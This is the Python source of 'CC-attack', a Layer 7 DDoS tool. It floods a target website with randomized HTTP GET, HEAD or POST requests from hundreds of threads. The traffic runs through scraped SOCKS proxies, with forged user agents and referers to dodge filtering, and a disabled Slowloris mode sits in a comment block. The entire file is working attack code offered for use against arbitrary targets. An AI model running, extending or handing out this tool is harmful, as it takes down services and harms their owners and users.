#!/usr/bin/python3
#Coded by L330n123
#########################################
#         Just a little change          #
#                           -- L330n123 #
#########################################
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os



print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 3.7 (2022/3/22)
							C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+] Changed Input Method           │
│          [+] Changed Output                 │
│          [+] Optimization                   │
│          [-] Removed Slow Attack            │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘''')

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]

######### Default value ########
mode = "cc"
url = ""
socks_ver = "5"
brute = False
out_file = "socks.txt"
thread_num = 800
data = ""
cookies = ""
###############################
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def build_threads(mode,thread_num,event,socks_type):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target = post,args=(event,socks_type,))
			th.daemon = True
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,socks_type,))
			th.daemon = True
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target = head,args=(event,socks_type,))
			th.daemon = True
			th.start()
			

def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
	return str(Intn(0,271400281257))#less random, more performance

def GenReqHeader(method):
	global data
	global target
	global path
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		user_agent = "User-Agent: " + getuseragent() + "\r\n"
		accept = Choice(acceptall)
		if data == "":# You can enable customize data
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	else:
		print("> That looks like not a correct url.")
		exit()
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Please enter the correct option")
			ans = ""
			continue
	return ans

def cc(event,socks_type):
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(3)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						break
				#s.setsockopt(socket.SO_LINGER,0)
				s.close()
			except:
				s.close()
		except:
			s.close()

def head(event,socks_type):#HEAD MODE
	header = GenReqHeader("head")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = head_host + header
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						break#   This part will jump to dirty fix
				s.close()
			except:
				s.close()
		except:#dirty fix
			s.close()

def post(event,socks_type):
	request = GenReqHeader("post")
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
		except:
			s.close()
''' idk why it's not working, so i temporarily removed it
def slow_atk_conn(socks_type,rlock):
	global socket_list
	proxy = Choice(proxies).strip().split(":")
	while 1:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(3)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			rlock.acquire()
			socket_list.append(s)
			rlock.release()
			return
		except:
			#print("Connection failed")
			s.close()
			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance

socket_list=[]
def slow(conn,socks_type):
	global socket_list
	rlock = threading.Lock
	for _ in range(conn):
		threading.Thread(target=slow_atk_conn,args=(socks_type,rlock,),daemon=True).start()
	while True:
		sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
		sys.stdout.flush()
		if len(socket_list) != 0 :
			for s in list(socket_list):
				try:
					s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
					sys.stdout.flush()
				except:
					s.close()
					socket_list.remove(s)
					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
					sys.stdout.flush()
			proxy = Choice(proxies).strip().split(":")
			for _ in range(conn - len(socket_list)):
				threading.Thread(target=slow_atk_conn,args=(socks_type,rlock,),daemon=True).start()
		else:
			time.sleep(0.1)
'''		
		
nums = 0
def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect(("1.1.1.1", 80))
			'''
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)'''
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):#Coded by Leeon123
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if socks_ver == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if socks_ver == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
	#if ans == "y" or ans == "":
	with open(out_file, 'wb') as fp:
		for lines in list(proxies):
			fp.write(bytes(lines,encoding='utf8'))
		fp.close()
	print("> They are saved in "+out_file)
			
def check_list(socks_file):
	print("> Checking list")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def downloadsocks(socks_ver):
	if socks_ver == "4":
		f = open(out_file,'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				fd = open(out_file,"a")
				fd.write(proxies)
				fd.close()
		except:
			pass
	if socks_ver == "5":
		f = open(out_file,'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
	print("> Have already downloaded proxies list as "+out_file)

def PrintHelp():
	print('''===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set socks version (4/5, default:5)
   -t        | set threads number (default:400)
   -f        | set proxies file (default:socks.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack period (default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================''')


def main():
	global socks_ver
	global data
	global cookies
	global brute
	global url
	global out_file
	global thread_num
	global mode
	global target
	global proxies
	target = ""
	check_proxies = False
	download_socks = False
	socks_type = 5
	period = 60
	print("> Mode: [cc/post/head]")#slow]")
	for n,args in enumerate(sys.argv):
		if args == "-help" or args =="-h":
			PrintHelp()
		if args=="-url":
			ParseUrl(sys.argv[n+1])
		if args=="-m" or args=="-mode":
			mode = sys.argv[n+1]
			if mode not in ["cc","post","head"]:#,"slow"]:
				print("> -m/-mode argument error")
				return
		if args =="-v":
			socks_ver = sys.argv[n+1]
			if socks_ver == "4":
				socks_type = 4
			elif socks_ver == "5":
				socks_type = 5
			elif socks_ver not in ["4","5"]:
				print("> -v argument error (only 4/5)")
				return
		if args == "-b":
			if sys.argv[n+1] == "1":
				brute = True
			elif sys.argv[n+1] == "0":
				brute = False
			else:
				print("> -b argument error")
				return
		if args == "-t":
			try:
				thread_num = int(sys.argv[n+1])
			except:
				print("> -t must be integer")
				return
		if args == "-cookies":
			cookies = sys.argv[n+1]
		if args == "-data":
			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
		if args == "-f":
			out_file = sys.argv[n+1]
		if args == "-down":
			download_socks=True
		if args == "-check":
			check_proxies = True
		if args == "-s":
			try:
				period = int(sys.argv[n+1])
			except:
				print("> -s must be integer")
				return

	if download_socks:
		downloadsocks(socks_ver)

	if os.path.exists(out_file)!=True:
		print("Proxies file not found")
		return
	proxies = open(out_file).readlines()	
	check_list(out_file)
	proxies = open(out_file).readlines()	
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return
	print ("> Number Of Proxies: %d" %(len(proxies)))
	if check_proxies:
		check_socks(3)

	proxies = open(out_file).readlines()

	if target == "":
		print("> There is no target. End of process ")
		return
	if mode == "slow":
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.daemon = True
		th.start()
	else:
		event = threading.Event()
		print("> Building threads...")
		build_threads(mode,thread_num,event,socks_type)
		event.clear()
		#input("Press Enter to continue.")
		event.set()
		print("> Flooding...")
	time.sleep(period)

if __name__ == "__main__":
	main()#Coded by Leeon123